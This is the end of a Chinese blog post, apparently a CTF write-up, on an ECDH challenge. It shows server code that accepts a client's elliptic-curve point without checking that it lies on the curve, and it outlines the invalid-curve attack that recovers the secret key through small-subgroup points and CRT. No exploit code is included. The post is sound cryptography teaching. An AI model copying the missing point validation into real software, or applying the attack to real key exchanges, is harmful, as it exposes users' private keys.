<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul</span><span class="params">(n,p)</span>:</span></span><br><span class="line">	r = zero</span><br><span class="line">	tmp = p</span><br><span class="line">	<span class="keyword">while</span> <span class="number">0</span> &lt; n:</span><br><span class="line">	    <span class="keyword">if</span> n &amp; <span class="number">1</span> == <span class="number">1</span>:</span><br><span class="line">	        r = add(r,tmp)</span><br><span class="line">	    n, tmp = n &gt;&gt; <span class="number">1</span>, add(tmp,tmp)</span><br><span class="line">	<span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exchange</span><span class="params">(self)</span>:</span></span><br><span class="line">		self.dosend(<span class="string">"Give me your key:\n"</span>) </span><br><span class="line">		self.dosend(<span class="string">"X:\n"</span>) </span><br><span class="line">		x = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">		self.dosend(<span class="string">"Y:\n"</span>) </span><br><span class="line">		y = int(self.recvall(<span class="number">80</span>))</span><br><span class="line">		key = (x,y)</span><br><span class="line">		result = mul(self.secret,key)</span><br><span class="line">		self.key = self.pointToKeys(result)</span><br><span class="line">		self.dosend(<span class="string">"Exchange success\n"</span>)</span><br></pre></td></tr></table></figure>
<p>攻击点：<strong>没有验证我们发送的key是否在曲线上</strong></p>
<p>原理：针对椭圆曲线的点加以及倍点运算中，结果与b是无关的，因此我们可以构造曲线$E_i:y^2=x^3+ax+b_i$，其中$order(E_i)$含有小素数因子$p_i$，于是我们可以发送点$P*(order(E_i)/p_i)$，而在密钥交换后我们h很快的计算出对方的$secretkey\mod p_i$的值，记为$c_i$，在经过多次反复密钥交换后，可利用CRT还原出secret key。</p>
<p>具体代码可参考<a href="https://ctftime.org/writeup/14469" target="_blank" rel="noopener">https://ctftime.org/writeup/14469</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
    <div class="article-tag tagcloud">
        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ECDH/" rel="tag">ECDH</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>
    </div>

      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2020 zraxx
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
            </div>
        </div>
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        
    </div>
</footer>
    </div>
    
<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>

    <script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 2;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>





    <script type="text/x-mathjax-config">
MathJax.Hub.Config({
    tex2jax: {
        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
        processEscapes: true,
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    }
});

MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
        all[i].SourceElement().parentNode.className += ' has-jax';                 
    }       
});
</script>

<script src="//cdn.bootcss.com/mathjax/2.6.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
</script>


<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
             title: "a.article-title, .article-more-link a", 
             post: ".article-entry a[href], .copyright a[href]", 
             tags: ".article-tag a", 
             categories: ".article-category a, a.tag-list-link", 
             articleNav: "#article-nav a, #post-nav-button a", 
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
             menu: ".header-menu a", 
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>